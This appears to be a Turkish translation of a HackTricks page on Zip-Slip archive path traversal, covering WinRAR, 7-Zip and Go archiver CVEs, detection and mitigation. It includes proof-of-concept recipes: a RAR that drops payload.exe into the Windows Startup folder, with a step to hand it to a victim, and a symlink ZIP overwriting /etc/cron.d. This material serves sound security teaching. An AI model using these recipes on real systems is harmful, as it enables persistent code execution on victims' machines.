# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Genel Bakış

Birçok archive formatı (ZIP, RAR, TAR, 7-ZIP vb.), her girdinin kendi **internal path** bilgisini taşımasına izin verir. Bir extraction utility bu path bilgisini herhangi bir doğrulama yapmadan kullandığında, `..` veya **absolute path** içeren hazırlanmış bir filename (ör. `C:\Windows\System32\`), kullanıcı tarafından seçilen directory'nin dışına yazılır.
Bu vulnerability sınıfı yaygın olarak *Zip-Slip* veya **archive extraction path traversal** olarak bilinir.

Sonuçlar arbitrary file'ların üzerine yazılmasından, Windows *Startup* folder gibi bir **auto-run** konumuna payload bırakarak doğrudan **remote code execution (RCE)** elde edilmesine kadar uzanabilir.

## Temel Neden

1. Attacker, bir veya daha fazla file header'ının şunları içerdiği bir archive oluşturur:
* Relative traversal sequences (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Absolute paths (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Veya target dir'in dışına çözümlenen hazırlanmış **symlinks** (*nix üzerinde ZIP/TAR'da yaygındır).
2. Victim, embedded path'e güvenen (veya symlinks'i takip eden), bunu sanitize etmek ya da extraction işlemini seçilen directory'nin altında zorlamak yerine vulnerable bir tool ile archive'ı extract eder.
3. File, attacker-controlled location'a yazılır ve system veya user bu path'i bir sonraki kez tetiklediğinde execute/load edilir.

### .NET `Path.Combine` + `ZipArchive` traversal

Yaygın bir .NET anti-pattern, amaçlanan destination ile **user-controlled** `ZipArchiveEntry.FullName` değerini birleştirip path normalization yapmadan extract etmektir:<sup>[[4]](#references)</sup>
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- `entry.FullName` `..\\` ile başlıyorsa traversal yapar; **absolute path** ise sol taraftaki bileşen tamamen atılır ve extraction identity olarak **arbitrary file write** elde edilir.
- Zamanlanmış bir scanner tarafından izlenen kardeş `app` dizinine yazmak için proof-of-concept archive:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
Bu ZIP dosyasını izlenen gelen kutusuna bırakmak, `C:\samples\app\0xdf.txt` dosyasının oluşturulmasına neden olur; bu da `C:\samples\queue\` dışına traversal yapıldığını kanıtlar ve devamındaki primitive'leri (ör. DLL hijack'leri) mümkün kılar.

## Gerçek Dünya Örneği – WinRAR ≤ 7.12 (CVE-2025-8088)

Windows için WinRAR (kapsamda `rar` / `unrar` CLI, DLL ve portable source da bulunur), extraction sırasında dosya adlarını validate edemiyordu.
Aşağıdakine benzer bir entry içeren malicious RAR archive:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
**dışında** ve kullanıcının *Startup* klasörünün içinde yer alacaktı. Windows, oturum açıldıktan sonra burada bulunan her şeyi otomatik olarak çalıştırır ve böylece *kalıcı RCE* sağlanır.<sup>[[5]](#references)</sup>

### PoC Archive Oluşturma (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Kullanılan seçenekler:
* `-ep` – dosya yollarını verildikleri haliyle saklar (baştaki `./` ifadesini **budama**).

`evil.rar` dosyasını kurbana teslim edin ve arşivi güvenlik açığı bulunan bir WinRAR build'i ile çıkarmasını söyleyin.

### Vahşi Ortamda Gözlemlenen Exploitation

ESET, CVE-2025-8088'i kötüye kullanan ve özelleştirilmiş backdoor'lar dağıtmak ve ransomware operasyonlarını kolaylaştırmak amacıyla RAR arşivleri ekleyen RomCom (Storm-0978/UNC2596) spear-phishing kampanyalarını bildirdi.<sup>[[5]](#references)</sup>

## Daha Yeni Vakalar (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Bug**: ZIP girdileri **symbolic link** olduğunda extraction sırasında dereference ediliyordu; bu da saldırganların hedef dizinin dışına çıkmasına ve keyfi yolların üzerine yazmasına olanak tanıyordu. Kullanıcı etkileşimi yalnızca arşivi *açmak/çıkarmak*tan ibarettir.<sup>[[1]](#references)</sup>
* **Etkilenenler**: 7-Zip 21.02–24.09 (Windows ve Linux build'leri). **25.00** (Temmuz 2025) ve sonraki sürümlerde düzeltildi.
* **Etki yolu**: `Start Menu/Programs/Startup` veya service-run konumlarının üzerine yazma → sonraki logon'da veya service restart sonrasında kod çalışır.
* **Hızlı PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
Patch uygulanmış bir build'de `/etc/cron.d` etkilenmez; symlink, `/tmp/target` içinde bir link olarak çıkarılır.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Bug**: `archiver.Unarchive()` `../` ve symlink'lenmiş ZIP girdilerini takip ederek `outputDir` dışına yazma işlemi gerçekleştirir.<sup>[[2]](#references)</sup>
* **Etkilenen**: `github.com/mholt/archiver` ≤ 3.5.1 (proje artık deprecated).
* **Fix**: `mholt/archives` ≥ 0.1.0 sürümüne geçin veya write işleminden önce canonical-path checks uygulayın.
* **Minimal reproduction**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Detection İpuçları

* **Static inspection** – Arşiv girdilerini listeleyin ve `../`, `..\\`, *absolute paths* (`/`, `C:`) içeren adları veya hedefi extraction dir dışındaki bir konum olan *symlink* türündeki girdileri işaretleyin.
* **Canonicalisation** – `realpath(join(dest, name))` değerinin hâlâ `dest` ile başladığından emin olun. Aksi durumda reddedin.<sup>[[3]](#references)</sup>
* **Sandbox extraction** – Güvenli bir extractor (ör. `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) kullanarak disposable bir dizine decompress edin ve ortaya çıkan yolların dizin içinde kaldığını doğrulayın.
* **Endpoint monitoring** – WinRAR/7-Zip vb. tarafından bir arşiv açıldıktan kısa süre sonra `Startup`/`Run`/`cron` konumlarına yazılan yeni executable'lar için alert oluşturun.

## Mitigation & Hardening

1. **Extractor'ı güncelleyin** – WinRAR 7.13+ ve 7-Zip 25.00+ path/symlink sanitisation uygular. Her iki tool'da da auto-update hâlâ bulunmamaktadır.
2. Mümkün olduğunda arşivleri “**Do not extract paths**” / “**Ignore paths**” seçenekleriyle extract edin.
3. Unix'te extraction öncesinde privileges'ı düşürün ve bir **chroot/namespace** mount edin; Windows'ta **AppContainer** veya bir sandbox kullanın.
4. Özel code yazıyorsanız create/write işleminden **önce** `realpath()`/`PathCanonicalize()` ile normalise edin ve destination dışına çıkan tüm girdileri reddedin.

## Etkilenen / Tarihsel Ek Vakalar

* 2018 – Snyk tarafından yayımlanan ve çok sayıda Java/Go/JS library'sini etkileyen büyük *Zip-Slip* advisory'si.
* 2023 – `-ao` merge sırasında benzer traversal gerçekleştiren 7-Zip CVE-2023-4011.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) slugs içindeki TAR extraction traversal'ı (v1.2'de patch).
* Write işleminden önce `PathCanonicalize` / `realpath` çağırmayan tüm özel extraction logic'leri.

## References

- [1] [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [2] [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [3] [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [4] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [ESET Research – Update WinRAR tools now: RomCom and others exploiting zero-day vulnerability (CVE-2025-8088)](https://www.welivesecurity.com/en/eset-research/update-winrar-tools-now-romcom-and-others-exploiting-zero-day-vulnerability/)

{{#include ../banners/hacktricks-training.md}}
